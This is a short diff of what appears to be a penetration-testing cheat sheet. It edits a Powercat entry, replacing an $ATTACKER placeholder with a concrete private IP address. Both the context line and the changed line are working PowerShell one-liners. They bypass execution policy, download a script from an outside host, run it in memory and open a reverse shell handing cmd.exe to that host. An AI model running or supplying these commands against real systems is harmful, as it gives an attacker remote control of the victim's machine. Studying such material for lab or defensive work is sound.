@@ -45,6 +45,6 @@ powershell IEX (New-Object Net.WebClient).DownloadString("http://$ATTACKER/rshel
 ## Powercat
 
 ```bash
-powershell  -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://$ATTACKER/powercat.ps1');powercat -c $ATTACKER -p 443 -e cmd.exe"
+powershell  -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.189/powercat.ps1');powercat -c 192.168.119.189 -p 443 -e cmd.exe"
 ```
 
